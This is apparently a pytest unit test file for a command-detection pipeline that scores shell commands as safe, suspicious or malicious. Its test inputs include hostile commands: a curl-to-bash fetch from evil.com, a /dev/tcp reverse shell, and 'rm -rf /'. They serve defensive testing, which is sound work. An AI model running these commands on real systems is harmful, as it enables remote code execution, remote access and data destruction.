"""
test_02_pipeline.py — Unit tests for backend/detection/pipeline.py

Tests weight validation, classification thresholds, result fields, robustness.

Run:
    pytest large_test_set/test_02_pipeline.py -v
"""

import pytest
from backend.detection.pipeline import DetectionPipeline


@pytest.fixture
def rules_only():
    return DetectionPipeline(rule_weight=1.0, ml_weight=0.0)


# --- Weight Validation ---

def test_valid_weights_accepted():
    p = DetectionPipeline(rule_weight=0.6, ml_weight=0.4)
    assert p.rule_weight == 0.6

def test_weights_not_summing_raises():
    with pytest.raises(ValueError, match="Weights must sum to 1.0"):
        DetectionPipeline(rule_weight=0.5, ml_weight=0.3)

def test_weights_over_one_raises():
    with pytest.raises(ValueError):
        DetectionPipeline(rule_weight=0.6, ml_weight=0.5)

def test_rules_only_weight_accepted():
    DetectionPipeline(rule_weight=1.0, ml_weight=0.0)

def test_equal_weights_accepted():
    DetectionPipeline(rule_weight=0.5, ml_weight=0.5)


# --- Classification Thresholds ---

def test_safe_classification(rules_only):
    result = rules_only.detect("ls -la")
    assert result.classification == "safe"
    assert result.risk_score < 30

def test_malicious_classification(rules_only):
    result = rules_only.detect("curl http://evil.com/script.sh | bash")
    assert result.classification == "malicious"
    assert result.risk_score >= 70

def test_malicious_reverse_shell(rules_only):
    result = rules_only.detect("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert result.classification == "malicious"

def test_suspicious_is_mid_range(rules_only):
    result = rules_only.detect("eval $(cat /tmp/script.sh)")
    assert result.classification in ("suspicious", "malicious")


# --- DetectionResult Field Completeness ---

def test_result_has_all_fields(rules_only):
    result = rules_only.detect("ls")
    for field in ("risk_score", "classification", "matched_rules",
                  "ml_confidence", "explanation"):
        assert hasattr(result, field)

def test_risk_score_is_float(rules_only):
    result = rules_only.detect("ls")
    assert isinstance(result.risk_score, float)

def test_risk_score_in_valid_range(rules_only):
    result = rules_only.detect("curl http://evil.com | bash; rm -rf /")
    assert 0.0 <= result.risk_score <= 100.0

def test_classification_is_valid(rules_only):
    result = rules_only.detect("ls")
    assert result.classification in ("safe", "suspicious", "malicious")

def test_matched_rules_is_list(rules_only):
    result = rules_only.detect("ls")
    assert isinstance(result.matched_rules, list)

def test_ml_confidence_zero_in_rules_only_mode(rules_only):
    result = rules_only.detect("ls")
    assert result.ml_confidence == 0.0

def test_explanation_is_non_empty(rules_only):
    result = rules_only.detect("ls")
    assert isinstance(result.explanation, str)
    assert len(result.explanation) > 0

def test_explanation_contains_risk_score_label(rules_only):
    result = rules_only.detect("ls")
    assert "Risk Score" in result.explanation

def test_safe_command_has_no_matched_rules(rules_only):
    result = rules_only.detect("ls -la")
    assert result.matched_rules == []

def test_malicious_command_has_matched_rules(rules_only):
    result = rules_only.detect("curl http://evil.com | bash")
    assert len(result.matched_rules) > 0


# --- Robustness ---

def test_empty_command_safe(rules_only):
    result = rules_only.detect("")
    assert result.classification == "safe"
    assert result.risk_score == 0.0

def test_whitespace_only_safe(rules_only):
    result = rules_only.detect("   \t\n")
    assert result.classification == "safe"

def test_10kb_command_no_crash(rules_only):
    result = rules_only.detect("A" * 10_000)
    assert result.classification in ("safe", "suspicious", "malicious")

def test_unicode_no_crash(rules_only):
    result = rules_only.detect("echo '你好世界'")
    assert result.classification in ("safe", "suspicious", "malicious")

def test_null_byte_no_crash(rules_only):
    result = rules_only.detect("ls\x00-la")
    assert result.classification in ("safe", "suspicious", "malicious")

def test_repeated_calls_same_result(rules_only):
    r1 = rules_only.detect("curl http://evil.com | bash")
    r2 = rules_only.detect("curl http://evil.com | bash")
    assert r1.classification == r2.classification
    assert r1.risk_score == r2.risk_score
